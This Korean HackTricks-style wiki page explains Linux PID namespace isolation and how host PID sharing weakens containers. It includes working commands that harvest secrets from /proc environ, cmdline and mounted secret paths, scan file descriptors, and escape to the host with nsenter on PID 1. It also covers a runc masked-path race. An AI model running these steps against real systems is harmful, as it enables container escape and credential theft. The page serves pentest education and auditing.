# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## 개요

PID namespace는 프로세스가 어떻게 번호가 지정되는지와 어떤 프로세스가 표시되는지를 제어합니다. 이것이 실제 머신이 아니더라도 컨테이너가 자체 PID 1을 가질 수 있는 이유입니다. namespace 내부에서 workload는 로컬 프로세스 트리처럼 보이는 것을 확인합니다. namespace 외부에서 host는 실제 host PID와 전체 프로세스 상태를 계속 확인합니다.<sup>[[3]](#references)</sup>

보안 관점에서 PID namespace가 중요한 이유는 프로세스 가시성이 가치 있기 때문입니다. workload가 host 프로세스를 볼 수 있게 되면 서비스 이름, command-line arguments, 프로세스 arguments로 전달된 secrets, `/proc`를 통해 확인할 수 있는 environment-derived state, 그리고 잠재적인 namespace-entry targets를 관찰할 수 있습니다. 적절한 조건에서 signal을 보내거나 ptrace를 사용하는 등 단순히 해당 프로세스를 보는 것 이상의 작업이 가능하다면 문제는 훨씬 심각해집니다.

## 동작

새 PID namespace는 자체적인 내부 프로세스 번호 지정으로 시작합니다. 해당 namespace 내부에서 생성되는 첫 번째 프로세스는 namespace 관점에서 PID 1이 되며, 이는 orphaned children과 signal behavior에 대해 특별한 init-like semantics를 갖게 된다는 의미이기도 합니다. 이는 init processes, zombie reaping과 관련된 여러 컨테이너의 특이한 동작 및 컨테이너에서 작은 init wrappers가 사용되는 이유를 설명합니다.<sup>[[3]](#references)</sup>

PID namespaces는 계층 구조를 이룹니다. ancestor namespace의 프로세스는 해당 ancestor에서 할당된 PID를 사용해 descendant를 대상으로 지정할 수 있지만, descendant는 일반적인 PID-based syscalls를 통해 ancestor에만 존재하는 tasks를 대상으로 지정하거나 `setns()`를 사용해 상위 ancestor PID namespace로 이동할 수 없습니다. descendant에 ancestor-owned procfs가 의도적으로 노출된 경우에는 ancestor의 process view가 여전히 leak될 수 있습니다. 또한 `setns()`로 PID namespace에 참여해도 caller 자체가 아니라 **future children**에 대한 namespace가 변경됩니다. 따라서 도구는 참여한 후 fork합니다. procfs mount는 이를 mount한 프로세스의 PID view를 유지하므로 `unshare(CLONE_NEWPID)` 후 새 procfs를 생성하는 것은 단순한 외관상의 문제가 아니라 보안과 관련된 작업입니다.<sup>[[3]](#references)</sup>

중요한 보안 교훈은 프로세스가 자신의 PID tree만 보기 때문에 격리된 것처럼 보여도 해당 격리는 의도적으로 제거될 수 있다는 점입니다. Docker에서는 이를 `--pid=host`를 통해 노출하고, Kubernetes에서는 `hostPID: true`를 통해 수행합니다. 컨테이너가 host PID namespace에 참여하면 workload는 host 프로세스를 직접 볼 수 있으며, 이후의 여러 attack paths가 훨씬 현실적인 것이 됩니다.

## Lab

PID namespace를 수동으로 생성하려면:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
이제 shell은 비공개 프로세스 뷰를 확인합니다. `--mount-proc` 플래그가 중요한 이유는 새 PID namespace에 맞는 procfs 인스턴스를 mount하여 내부에서 프로세스 목록이 일관되도록 만들기 때문입니다.<sup>[[3]](#references)</sup>

컨테이너 동작을 비교하려면:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
차이는 즉각적이고 이해하기 쉬우므로, 독자를 위한 첫 번째 lab으로 적합합니다.

## Runtime 사용

Docker, Podman, containerd 및 CRI-O의 일반적인 컨테이너는 자체 PID namespace를 사용합니다. Kubernetes 컨테이너는 일반적으로 서로 분리된 PID view를 사용하며, `shareProcessNamespace: true`는 의도적으로 Pod 전체에서 하나의 view를 생성합니다.<sup>[[4]](#references)</sup> 반면 `hostPID: true`는 node의 PID namespace를 선택합니다. LXC/Incus 환경도 동일한 kernel primitive에 의존하지만, system-container 사용 사례에서는 더 복잡한 process tree가 노출될 수 있고 더 많은 debugging shortcut을 사용하게 될 수 있습니다.

동일한 규칙이 모든 환경에 적용됩니다. runtime이 PID namespace를 격리하지 않도록 선택했다면, 이는 container boundary를 의도적으로 약화한 것입니다.

## Misconfigurations

가장 대표적인 misconfiguration은 host PID sharing입니다. 팀에서는 debugging, monitoring 또는 service-management 편의를 위해 이를 정당화하는 경우가 많지만, 항상 중요한 security exception으로 취급해야 합니다. container에 host process에 대한 즉각적인 write primitive가 없더라도, visibility만으로도 시스템에 관한 많은 정보를 노출할 수 있습니다. `CAP_SYS_PTRACE`와 같은 capabilities나 유용한 procfs access가 추가되면 risk는 크게 증가합니다.

또 다른 실수는 workload가 기본적으로 host process를 kill하거나 ptrace할 수 없으므로 host PID sharing이 무해하다고 가정하는 것입니다. 이러한 결론은 enumeration의 가치, namespace-entry target의 가용성, 그리고 PID visibility가 다른 약화된 control과 결합되는 방식을 무시합니다.

### Kubernetes Pod 전체 process sharing

`shareProcessNamespace: true`는 `hostPID`와 다릅니다. node process가 아니라 **동일한 Pod 내 다른 container의 process**를 노출합니다. 그러면 compromised sidecar 또는 debug container가 procfs access check의 적용을 받으며 sibling의 command line과 environment data를 enumerate하고, credentials가 허용하는 경우 signal을 보내며, `/proc/<pid>/root`를 통해 sibling의 filesystem을 탐색할 수 있습니다. Kubernetes는 command-line/environment secret과 container filesystem이 해당 Unix permission에 의해서만 보호된다고 명시적으로 경고합니다.<sup>[[4]](#references)</sup>

유용한 cluster-side review:
```bash
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
[.metadata.namespace,.metadata.name,
(.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```
Pod-wide PID namespace의 compromised container에서 먼저 visibility가 곧 readability를 의미한다고 가정하지 말고 실제 access를 테스트하세요:<sup>[[4]](#references)</sup>
```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```
## 악용

호스트 PID namespace가 공유되면 공격자는 호스트 프로세스를 검사하고, 프로세스 인자를 수집하며, 흥미로운 서비스를 식별하고, `nsenter`에 사용할 후보 PID를 찾거나, 프로세스 가시성과 ptrace 관련 권한을 결합해 호스트 또는 인접 workload를 방해할 수 있습니다. 경우에 따라 적절한 장기 실행 프로세스를 확인하는 것만으로도 나머지 공격 계획을 재구성하기에 충분합니다.

첫 번째 실질적인 단계는 항상 호스트 프로세스가 실제로 표시되는지 확인하는 것입니다:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
호스트 PID가 표시되면, 프로세스 인자와 namespace 진입 대상이 흔히 가장 유용한 정보원이 됩니다:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
`nsenter`가 사용 가능하고 충분한 권한이 있다면, 표시되는 호스트 프로세스를 namespace bridge로 사용할 수 있는지 테스트합니다:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
진입이 차단된 경우에도 호스트 PID 공유는 이미 유용하다. 서비스 구성, runtime 구성 요소, 그리고 다음 대상으로 삼을 수 있는 권한 있는 프로세스 후보를 노출하기 때문이다. PID visibility만으로는 signal을 보내거나, trace하거나, 민감한 `/proc/<pid>` 항목을 읽거나, target의 다른 namespace에 join할 권한이 부여되지 않는다. credentials, dumpability, target namespace를 소유하는 user namespace의 capabilities, Yama/LSM policy, seccomp도 여전히 중요하다.<sup>[[3]](#references)</sup> 프로세스 injection 예시는 [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)를 참조하라.

호스트 PID visibility는 file-descriptor abuse도 보다 현실적으로 만든다. 권한 있는 호스트 프로세스나 인접 workload가 민감한 파일 또는 socket을 열어 둔 경우, attacker는 ptrace 스타일 검사, 소유권, procfs mount options, object type, target service model에 따라 `/proc/<pid>/fd/`를 검사하고 underlying object에 접근할 수 있을 수 있다. FD symlink가 보인다고 해서 이를 열 수 있다는 뜻은 아니며, socket은 해당 `/proc/<pid>/fd/N` symlink를 여는 것만으로 duplicate할 수 없다. 별개의 `pidfd_getfd()` primitive와 그 authorization checks는 [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md)를 참조하라.<sup>[[3]](#references)</sup>
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
이 명령어들은 `hidepid=1` 또는 `hidepid=2`가 프로세스 간 visibility를 줄이고 있는지, 그리고 열려 있는 secret 파일, 로그 또는 Unix socket과 같이 명백히 중요한 descriptor가 전혀 보이는지를 확인하는 데 유용합니다.

### 전체 예시: host PID + `nsenter`

프로세스에 host namespace에 참여할 수 있을 만큼 충분한 권한도 있으면 Host PID sharing은 직접적인 host escape가 됩니다:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
명령이 성공하면 컨테이너 프로세스는 이제 호스트의 mount, UTS, network, IPC 및 PID namespaces에서 실행됩니다. 그 영향은 즉각적인 호스트 장악으로 이어집니다.

`nsenter` 자체가 없더라도 호스트 filesystem이 마운트되어 있다면 호스트 바이너리를 통해 동일한 결과를 얻을 수 있습니다:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### 최근 Runtime 참고 사항

일부 PID namespace 관련 공격은 전통적인 `hostPID: true` misconfiguration이 아니라, container 설정 중 procfs 보호 기능이 적용되는 방식과 관련된 runtime 구현 버그입니다.

#### `maskedPaths` race를 통한 host procfs 접근

취약한 `runc` 버전에서는 container image 또는 `runc exec` workload를 제어할 수 있는 공격자가 container 측 `/dev/null`을 `/proc/sys/kernel/core_pattern`과 같은 민감한 procfs 경로를 가리키는 symlink로 교체하여 masking 단계를 race할 수 있습니다. race가 성공하면 masked-path bind mount가 잘못된 대상에 적용되어 새 container에 host 전역 procfs 설정을 노출할 수 있습니다.<sup>[[1]](#references)</sup>

유용한 검토 명령:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
이것이 중요한 이유는 최종적인 영향이 직접적인 procfs 노출과 동일할 수 있기 때문입니다. 즉, 쓰기 가능한 `core_pattern` 또는 `sysrq-trigger`를 통해 host code execution이나 denial of service로 이어질 수 있습니다. 전용 [masked paths](../masked-paths.md) 및 [sensitive host mounts](../../sensitive-host-mounts.md) 페이지에서 이 내용을 중복해서 다루지 않고 일반적인 procfs attack surface를 설명합니다.

#### `insject`를 사용한 Namespace injection

`insject`와 같은 Namespace injection 도구는 process creation 전에 대상 namespace에 미리 진입하지 않아도 PID-namespace interaction이 항상 가능한 것은 아님을 보여줍니다. helper는 나중에 attach하고, `setns()`를 사용한 뒤, 대상 PID space에 대한 visibility를 유지하면서 실행할 수 있습니다:<sup>[[2]](#references)</sup>
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
이러한 종류의 technique은 runtime이 이미 workload를 초기화한 후 namespace context를 연결해야 하는 advanced debugging, offensive tooling 및 post-exploitation workflow에서 주로 중요합니다.

### Related FD Abuse Patterns

host PID가 표시되는 경우 명시적으로 언급할 가치가 있는 두 가지 패턴이 있습니다. 첫째, privileged process가 `O_CLOEXEC`로 표시되지 않았기 때문에 `execve()` 전반에 걸쳐 민감한 file descriptor를 열린 상태로 유지할 수 있습니다. 둘째, service가 `SCM_RIGHTS`를 통해 Unix socket으로 file descriptor를 전달할 수 있습니다. 두 경우 모두 중요한 object는 더 이상 pathname이 아니라, lower-privilege process가 상속하거나 수신할 수 있는 이미 열린 handle입니다.

이는 container 작업에서 중요합니다. handle이 `docker.sock`, privileged log, host secret file 또는 기타 high-value object를 가리킬 수 있기 때문입니다. path 자체가 container filesystem에서 직접 접근 가능하지 않은 경우에도 마찬가지입니다.

## Checks

이 명령의 목적은 process가 private PID view를 사용하는지, 아니면 이미 훨씬 더 광범위한 process landscape를 열거할 수 있는지 확인하는 것입니다.
```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```
여기서 중요한 점:<sup>[[3]](#references)</sup>

- 프로세스 목록에 명백한 host 서비스가 포함되어 있다면, host PID sharing이 이미 적용되어 있을 가능성이 높습니다.
- 매우 작은 container-local 트리만 보이는 것이 일반적인 기준입니다. `systemd`, `dockerd` 또는 관련 없는 daemon이 보인다면 정상적이지 않습니다.
- `NSpid`는 중첩된 namespace 전반의 PID mapping을 노출할 수 있습니다. 가장 왼쪽 값은 procfs mount와 연결된 PID namespace를 기준으로 하며, 그 뒤에 중첩된 namespace가 깊어지는 순서대로 값이 표시됩니다.
- `readlink /proc/self/ns/pid`만으로는 `hostPID`를 입증할 수 없습니다. 격리된 container에도 유효한 PID-namespace inode가 있기 때문입니다. 이를 process list, procfs mount, runtime configuration, 그리고 가능한 경우 host 측 namespace inode와 함께 대조해야 합니다.
- host PID가 보이기 시작하면, 읽기 전용 process 정보조차 유용한 reconnaissance 정보가 됩니다.

host PID sharing으로 실행 중인 container를 발견했다면, 이를 단순한 외관상의 차이로 취급하지 마십시오. 이는 workload가 관찰하고 잠재적으로 영향을 줄 수 있는 범위를 크게 바꾸는 중요한 변화입니다.



## References

- [1] [runc 보안 권고: mount race condition으로 인한 "masked path" 악용을 통한 container escape (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Tool Release – insject: Linux Namespace Injector](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Linux man-pages 6.19 도서](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Pod 내 Container 간 Process Namespace 공유](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
{{#include ../../../../../banners/hacktricks-training.md}}
